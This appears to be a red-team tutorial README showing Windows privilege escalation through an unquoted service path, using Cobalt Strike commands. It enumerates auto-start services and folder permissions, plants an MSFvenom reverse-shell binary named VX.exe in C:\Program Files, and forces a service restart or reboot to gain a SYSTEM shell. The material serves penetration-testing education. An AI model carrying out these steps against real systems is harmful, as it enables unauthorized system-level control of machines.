# Privilege escalation using 'Unquoted Service Path'

#### 1. Enumerating the services 


In the console, user can execute the inbuilt beacon commands. To list all the avialble commands, type 'help' and press enter.
Sample output of help command:
In old version of Cobalt Strike, to execute Windows OS command, we have to user `shell OS command` and in new version `run OS command`.

Let's start with enumeration of service name, it's binary path and start mode. 
Below mentioned command will find all the services which are running in `Auto` start mode and binary path is outside the `C:\Windows` directory 

Old version

    shell wmic service get name, pathname, startmode | findstr /i "auto" | findstr /i /v "c:\windows"
    
  New version
   
    run wmic service get name, pathname, startmode | findstr /i "auto" | findstr /i /v "c:\windows"

<img src=https://raw.githubusercontent.com/incredibleindishell/Red_Team_Op/main/Unquoted_service_path/images/wmic.png width="800" height="200"/>

After finding the services, let's check service privilege by executing below mentioned command:

    shell sc qc "service name"
In this case, service name is `VX Search Server`, hence command will be:

    shell sc qc "VX Search Server"

<img src=https://raw.githubusercontent.com/incredibleindishell/Red_Team_Op/main/Unquoted_service_path/images/wmic2.png width="900" height="400"/>

Service is running with the `local system` privilege i.e. `NT Authority\SYSTEM` which is a good candidate for privilege escalation.

Now, to enumerate the permission on a Windows directory for various users or groups, following to commands can be used:

Using icacls binary

    shell icacls "C:\Program Files\\"

Using PowerShell cmdlet:

    powershell Get-Acl -Path  "C:\Program Files\\"

<img src=https://raw.githubusercontent.com/incredibleindishell/Red_Team_Op/main/Unquoted_service_path/images/wmic_enum3.png width="900" height="500"/>

Note: Discovery of unquoted service can be performed using PowerUp PowerShell script as well. The function name is `Get-UnquotedService`.


#### 2. Exploation 

Following steps are required to exploit this issue:
  
  <b>a)</b> <a href=https://github.com/incredibleindishell/Red_Team_Op/edit/main/Unquoted_service_path/Readme.MD#a-create-a-binary-to-get-reversebind-shell>Create a binary to get reverse/bind shell</a>
  
  <b>b)</b> <a href=https://github.com/incredibleindishell/Red_Team_Op/edit/main/Unquoted_service_path/Readme.MD#b-uploading-the-binary-to-a-parent-directory-of-the-service-binary>Upload it to a parent directory of the service binary.</a>
  
  <b>c)</b> <a href=https://github.com/incredibleindishell/Red_Team_Op/edit/main/Unquoted_service_path/Readme.MD#c-restart-the-machine-or-service>Restart the machine or service to get the privileged shell</a>

###### a) Create a binary to get reverse/bind shell

MSFvenom can be used to create binary which will get us reverse shell. 
In this case, Service binaries are saved under directory `VX Search Server`, hence generated binary will have name `VX.exe`

<img src=https://raw.githubusercontent.com/incredibleindishell/Red_Team_Op/main/Unquoted_service_path/images/wmic3.png width="900" height="200"/>


###### b) Uploading the binary to a parent directory of the service binary

The service binaries are saved under directory `VX Search Server` which is a child directory of `C:\program Files\`.
Using Cobalt strike, upload this binary to `C:\program Files\` directory. Command is

    upload local_path_to_the_binary
In this case it was:
    upload VX.exe

<img src=https://raw.githubusercontent.com/incredibleindishell/Red_Team_Op/main/Unquoted_service_path/images/wmic4.png width="750" height="200"/>

###### c) Restart the machine or service 
Now, everything is in place, all we need to do is, restart the machine or service.

To restart/start the service, following command can be used:

    shell sc start "Service name"

Which was:
   
    shell sc start "VX Search Server"

Sometime, user does not have permission to start or restart a service. In such scenario, try to reboot the machine as most of the time, low privilege user will have this privilege. Once machine will be restarted, service will be restarted automatically which will serve the purpose.

Below mentioned command can be used to restart the machine using Cobalt Strike CLI:

    shell shutdown /r /t 0

<img src=https://raw.githubusercontent.com/incredibleindishell/Red_Team_Op/main/Unquoted_service_path/images/wmic5.png width="900" height="400"/>

Once machine will reboot, MSFvenom binary will be executed and attacker machine will recieve reverse shell connection:

<img src=https://raw.githubusercontent.com/incredibleindishell/Red_Team_Op/main/Unquoted_service_path/images/wmic6.png width="900" height="400"/>

And here we go, a nice privileged shell:

<img src=https://raw.githubusercontent.com/incredibleindishell/Red_Team_Op/main/Unquoted_service_path/images/final.png width="900" height="400"/>

<b>./init 0</b>
